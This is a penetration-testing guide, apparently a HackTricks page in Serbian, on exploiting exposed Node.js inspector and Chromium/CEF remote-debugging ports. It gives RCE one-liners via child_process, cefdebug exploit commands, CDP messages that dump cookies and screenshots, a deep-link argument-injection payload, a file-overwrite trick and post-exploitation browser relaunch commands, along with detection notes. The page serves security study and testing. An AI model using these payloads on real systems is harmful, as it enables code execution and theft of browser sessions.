# Zloupotreba Node inspector/CEF debug-a

{{#include ../../banners/hacktricks-training.md}}

Istorijski praktični primeri uključuju vodič Multimaster i napad preko Visual Studio Code debugger-a CVE-2019-1414; koristite ih kao kontekst specifičan za određene verzije, umesto da pretpostavite da svaki aktuelni Electron ili Chromium cilj izlaže iste mogućnosti.<sup>[[1]](#references)[[3]](#references)</sup>

## Osnovne informacije

[Iz dokumentacije](https://nodejs.org/learn/getting-started/debugging): Kada se pokrene pomoću opcije `--inspect`, Node.js proces osluškuje zahteve debugging klijenta. Po **podrazumevanim podešavanjima**, osluškivaće na hostu i portu **`127.0.0.1:9229`**. Svakom procesu se dodeljuje i **jedinstveni** **UUID**.<sup>[[4]](#references)</sup>

Inspector klijenti moraju znati i navesti adresu hosta, port i UUID da bi se povezali. Puna URL adresa izgleda otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima pun pristup Node.js okruženju za izvršavanje**, zlonamerni akter koji može da se poveže na ovaj port možda će moći da izvrši proizvoljan kod u ime Node.js procesa (**potencijalna eskalacija privilegija**).<sup>[[4]](#references)</sup>

Inspector se može pokrenuti na nekoliko načina:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Kada pokrenete proces koji se ispituje, pojaviće se nešto poput ovoga:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) mogu da izlože debugger pomoću opcije `--remote-debugging-port=9222`. Time se pregledač izlaže preko [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a ne preko Node.js inspector-a, pa payload-i zasnovani na Node.js `process` objektu podrazumevano nisu direktno primenljivi.<sup>[[2]](#references)[[5]](#references)</sup>

Kada pokrenete browser sa debugger-om, pojaviće se nešto poput ovoga:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerisanje CDP endpoint-a i upravljanje njime

HTTP discovery endpoint-i razlikuju WebSocket za **browser** od WebSocket-ova za pojedinačne **target**-e (tab, worker, extension itd.). Pošaljite upit na `/json/version` za browser endpoint, a na `/json/list` za target-e; zatim se vraćenim vrednostima `webSocketDebuggerUrl` može direktno upravljati pomoću CDP poruka nalik JSON-RPC-u.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Na primer, povežite se pomoću `websocat "$BROWSER_WS"` i pošaljite `{"id":1,"method":"Target.getTargets"}` ili `{"id":2,"method":"Storage.getCookies"}`. Na page target-u (`websocat "$PAGE_WS"`), `Runtime.evaluate` izvršava kod u tom renderer-u, a `Page.captureScreenshot` vraća screenshot kodiran u base64 formatu. `document.cookie` ne može da otkrije `HttpOnly` cookies, dok `Storage.getCookies` traži od browser-a njegovu cookie store.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Pregledači, WebSocket-i i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Veb-sajtovi otvoreni u veb-pregledaču mogu da šalju WebSocket i HTTP zahteve u okviru bezbednosnog modela pregledača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije debugger-a**. **Same-origin policy** **sprečava** veb-sajtove da uspostave **ovu HTTP vezu**. Radi dodatne zaštite od [**DNS rebinding napada**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da li **zaglavlja 'Host'** veze sadrže **IP adresu** ili tačno **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ova **bezbednosna mera sprečava iskorišćavanje inspector-a** za izvršavanje koda **samo slanjem HTTP zahteva** (što se može uraditi iskorišćavanjem SSRF ranjivosti).<sup>[[4]](#references)</sup>

### Pokretanje inspector-a u procesima koji su pokrenuti

Pokrenutom Node.js procesu možete poslati **signal SIGUSR1** da biste pokrenuli **inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljne privilegije, pa vam ovo može omogućiti **privilegovan pristup informacijama unutar procesa**, ali ne i direktno podizanje privilegija.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa opcijom `--inspect` **nije moguće**, pošto će **kontejner** biti **ugašen** zajedno sa procesom.<sup>[[6]](#references)</sup>

### Povezivanje sa inspector/debugger

Da biste se povezali sa **pregledačem zasnovanim na Chromium-u**, možete pristupiti URL adresama `chrome://inspect` ili `edge://inspect`, za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** pravilno navedeni. Slika prikazuje primer Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nakon toga će se pojaviti URL adresa za pristup debugger-u, npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debugger: Da biste se povezali sa pregledačem zasnovanim na Chromium-u,...](<../../images/image (674).png>)

Pomoću **komandne linije** možete da se povežete sa debugger/inspector-om koristeći:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalaženje inspektora** koji rade lokalno i **ubacivanje koda** u njih.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Imajte na umu da **NodeJS RCE exploits neće raditi** ako ste povezani sa browser-om preko [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (treba da proverite API i pronađete zanimljive stvari koje možete da uradite pomoću njega).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE u NodeJS Debugger/Inspector-u

> [!TIP]
> Ako ste ovde došli tražeći način da dobijete [**RCE iz XSS-a u Electron-u, pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE-a** kada možete da se **povežete** na Node **inspector** koriste nešto poput ovoga (izgleda da ovo **neće raditi pri povezivanju sa Chrome DevTools protocol-om**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

API možete da proverite ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
U ovom odeljku ću samo navesti zanimljive stvari za koje sam otkrio da su ih ljudi koristili za eksploataciju ovog protokola.

### Ograničenje podrazumevanog profila u Chrome 136+

Od **Chrome 136**, Chrome ignoriše `--remote-debugging-port` i `--remote-debugging-pipe` kada ciljaju **podrazumevani direktorijum podataka Chrome-a**. Uz ovu opciju mora da se koristi nestandardni `--user-data-dir`. Njegov zaseban ključ za šifrovanje i izolovano stanje pregledača sprečavaju da jednostavna tehnika zasnovana na zastavici izloži uobičajeni, autentifikovani profil korisnika. Ne treba pretpostaviti da se ovo ograničenje specifično za Chrome odnosi na starije verzije Chrome-a, Chrome for Testing, aplikacije Electron/CEF ili druge Chromium derivate, a da se to prethodno ne proveri.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Dakle, to što vidite da je trenutni Chrome proces pokrenut samo sa opcijom `--remote-debugging-port` **ne** dokazuje da je CDP postao aktivan. Potvrdite da listener postoji i proverite `/json/version`, pa utvrdite koji profil ga zapravo koristi.<sup>[[14]](#references)</sup>

### Ubacivanje parametara putem Deep Links

U slučaju [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security je otkrio da je aplikacija zasnovana na CEF-u **registrovala prilagođeni URI** u sistemu (workspaces://index.html), koji je primao ceo URI, a zatim **pokretao aplikaciju zasnovanu na CEF-u** sa konfiguracijom koja je delimično sastavljena od tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su URI parametri bili URL decoded i korišćeni za pokretanje osnovne aplikacije zasnovane na CEF-u, što je korisniku omogućilo da **ubaci** zastavicu **`--gpu-launcher`** u **komandnu liniju** i izvrši proizvoljne komande.<sup>[[8]](#references)</sup>

Dakle, payload kao što je:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Izvršiće calc.exe.<sup>[[8]](#references)</sup>

### Prepisivanje datoteka

Promenite fasciklu u koju će se **preuzete datoteke čuvati** i preuzmite datoteku kako biste **prepisali** često korišćeni **izvorni kod** aplikacije svojim **zlonamernim kodom**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE i eksfiltracija

STAR Labs je pokazao da izložene WebDriver/CDP usluge mogu omogućiti proizvoljno čitanje datoteka i RCE; DNS rebinding u nekim konfiguracijama može dovršiti lanac eksploatacije.<sup>[[9]](#references)</sup>

ChromeDriver-ova WebDriver usluga razlikuje se od Chrome DevTools/CDP-a. Njegova [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) određuje izvršnu datoteku pregledača koja se pokreće za novu sesiju. Ako neprivilegovani pozivalac može da pristupi ChromeDriver usluzi koja radi kao root i da pošalje sesiju sa putanjom do izvršne datoteke koju kontroliše, to pokretanje može preći granicu privilegija usluge. Prazan odgovor `/sessions` ne znači da nove sesije ne mogu da se kreiraju. Pre nego što zaključite da je ovaj put upotrebljiv, proverite vlasnika procesa, stvarnu dostupnost listenera, autorizaciju sesije, pristup izvršnoj datoteci i ograničenja. Sam naziv procesa ili uobičajeni port nisu dovoljni. [Google-ove bezbednosne smernice](https://developer.chrome.com/docs/chromedriver/security-considerations) preporučuju pokretanje ChromeDriver-a pod neprivilegovanim nalogom. Pasivno izviđanje ne bi trebalo da kreira WebDriver sesiju.

Za dodatne istorijske slučajeve automatizacije pregledača i bezbednosti Chromium-a pogledajte Counter WebDriver write-up i Project Zero probleme 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Omogućavanje CDP-a unutar aktivnog Chromium procesa

Na Windows-u je [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) pokazao da ograničenje komandne linije nije jedini način za aktiviranje CDP-a: kod koji već može da se ubaci u postojeći `msedge.exe` može da pozove neizvezeni Chromium-ov `content::DevToolsAgentHost::StartRemoteDebuggingServer` i izloži aktivni profil sa autentifikacijom, bez ponovnog pokretanja pregledača.<sup>[[15]](#references)</sup>

Prikazani lanac ubacuje DLL pomoću `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, razrešava interne Edge simbole (najpre iz PDB-ova, a zatim pomoću bajt-potpisā specifičnih za verziju), postavlja podklasu za prozor pregledača i šalje poruku kako bi se završni poziv za pokretanje servera izvršio na **UI thread-u** pregledača. Socket se vezuje za loopback, nakon čega uobičajeni CDP primitivni postupci mogu da pribave kolačiće, snime tabove, pregledaju mrežni saobraćaj ili izvrše JavaScript na stranicama sa autentifikacijom.<sup>[[15]](#references)</sup>

> [!WARNING]
> Ovo je tehnika **nakon kompromitovanja/ubacivanja u proces**, a ne mrežno zaobilaženje autentifikacije. U velikoj meri zavisi od konkretne verzije jer relevantni C++ simboli nisu izvezeni, a potpisi se mogu promeniti nakon ažuriranja pregledača.<sup>[[15]](#references)</sup>

Za detekciju se nemojte oslanjati samo na telemetriju komandne linije `--remote-debugging-*`: povežite i neuobičajene rukohvate i memorijske operacije nad procesima pregledača (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, kreiranje niti), ubacivanje DLL-ova i neočekivane loopback listening socket-e čiji su vlasnici Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

U stvarnom okruženju, **nakon kompromitovanja** korisničkog računara na kom se koristi pregledač zasnovan na Chromium-u, istorijska tehnika bila je ponovno pokretanje pregledača sa omogućenim debugging-om i prosleđivanje loopback porta. Ovo može izložiti stanje pregledanja žrtve na proizvodima/verzijama koji i dalje prihvataju izabrani profil, ali Chrome 136+ neće prihvatiti ovo za svoj podrazumevani direktorijum podataka.<sup>[[7]](#references)[[14]](#references)</sup>

Originalna komanda za ponovno pokretanje sačuvana je ispod za starije ciljeve ili ciljeve specifične za određenu verziju. Druga komanda je podržani oblik za aktuelni Chrome, ali ona kreira izolovani profil umesto da ponovo otvori uobičajeno stanje žrtve sa autentifikacijom.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Za Chromium relaunch, ekstenzije i CDP tradecraft specifične za macOS pogledajte [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Alat za inspekciju i eksploataciju CEF/Chromium debugger-a](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution u Visual Studio Code-u putem Chrome DevTools Debugger-a](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js vodič za debugging - Početak](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 izveštaj - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome funkcije za debugging radi daljinskog nadgledanja i upravljanja sesijama pregledanja](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution u AWS WorkSpaces-u](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Pričaš li sa mnom? - WebDriver RCE putem DNS rebinding-a i CDP-a (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Od bot-a do RCE-a](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium tracker grešaka)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium tracker grešaka)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium tracker grešaka)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Izmene prekidača za daljinsko debugging radi veće bezbednosti - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Ubacivanje CDP-a u pokrenuti Edge Browser: Detaljan pregled runtime instrumentacije browser-a](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
